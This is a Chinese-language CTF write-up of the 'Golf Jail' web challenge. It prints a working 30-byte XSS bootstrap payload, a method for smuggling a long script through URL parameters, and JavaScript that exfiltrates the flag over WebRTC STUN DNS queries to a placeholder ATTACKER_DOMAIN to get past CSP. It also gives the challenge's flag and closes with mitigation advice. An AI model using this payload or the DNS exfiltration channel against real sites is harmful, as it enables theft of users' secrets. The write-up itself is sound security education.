# Golf Jail

## 题目简述

页面把管理员 Cookie 中的 flag 写入 `iframe srcdoc` 的 HTML 注释，并允许用户控制同一 `srcdoc` 中最多 30 字节：

```html
<iframe
  sandbox="allow-scripts"
  srcdoc="<!-- FLAG --><div>USER_INPUT</div>"
></iframe>
```

父页面的 CSP 是：

```text
default-src 'none';
frame-ancestors 'none';
script-src 'unsafe-inline' 'unsafe-eval';
```

目标是在 30 字节限制内启动任意 JavaScript，从 iframe 的注释节点读取 flag，再绕过出站限制传到攻击者控制的 DNS。

## 解题过程

虽然 PHP 对输入调用了 `htmlspecialchars`，但 `srcdoc` 会经历两次解析：外层页面先把 `&lt;` 等实体还原为属性值，随后 iframe 把该属性值作为新的 HTML 文档解析。因此输入的标签仍能在子文档中成形。

刚好 30 字节的启动载荷是：

```html
<svg onload=eval('`'+baseURI)>
```

`sandbox="allow-scripts"` 允许事件处理器执行，但没有 `allow-same-origin`，所以 iframe 得到不透明源，不能读取父窗口。关键是子文档的 `baseURI` 仍继承父页面的完整 URL；内联事件处理器作用域又允许直接引用 `baseURI`。因此可以把真正的长脚本放在 URL 的其他查询参数中。

利用 URL 的逻辑结构如下：

```text
https://golfjail.chals.sekai.team/
?a=`;/*
&xss=<svg onload=eval('`'+baseURI)>
&b=*/LONG_JAVASCRIPT
```

实际发送时需要对特殊字符做 URL 编码。事件触发后，`eval` 的参数相当于：

```javascript
`https://golfjail.chals.sekai.team/?a=`;/*
  xss 参数及中间 URL 内容
*/LONG_JAVASCRIPT
```

第一个反引号来自启动载荷，`a` 参数中的反引号关闭模板字符串；`/* ... */` 隐藏 URL 中无法直接执行的部分，`b` 后面的长脚本才真正运行。这样 30 字节限制只约束引导器，不约束实际逻辑。

flag 位于 iframe 文档的首个注释节点，可直接取得：

```javascript
const flag = document.childNodes[0].textContent.trim();
```

普通 `fetch`、图片和脚本请求会被 `default-src 'none'` 阻止。目标 Chrome 中仍可借助 WebRTC ICE 服务器触发 STUN 主机名的 DNS 查询。将 flag 编成十六进制 DNS 标签：

```javascript
const hex = [...flag]
  .map(c => c.charCodeAt(0).toString(16).padStart(2, "0"))
  .join("");

const part = hex.slice(offset, offset + 60);
const pc = new RTCPeerConnection({
  iceServers: [{
    urls: `stun:${part}.ATTACKER_DOMAIN`
  }]
});

pc.createDataChannel("d");
pc.createOffer()
  .then(offer => pc.setLocalDescription(offer));
```

DNS 单个标签最多 63 字节，需改变 `offset` 分多次泄露并在本地十六进制解码。向 Admin Bot 提交构造后的同源 URL即可在 DNS 日志中收到数据。

[完整复现记录](https://blog.antoniusblock.net/posts/golfjail/)给出了两段 DNS 数据的拼接过程，最终 flag 为：

```text
SEKAI{jsjails_4re_b3tter_th4n_pyjai1s!}
```

## 方法总结

本题组合了三类浏览器边界：`srcdoc` 的二次 HTML 解析、沙箱文档继承的 `baseURI`，以及 CSP 下 WebRTC 仍可产生的 DNS 信道。短 XSS 载荷不必容纳完整逻辑，只需找到可控的长字符串来源并交给 `eval`。防护上不能仅依赖输出转义和长度限制；不应把秘密嵌入攻击者可执行脚本的文档，也应去掉 `unsafe-inline`、`unsafe-eval`，并在 Bot 网络层限制 DNS 与 STUN 出站。
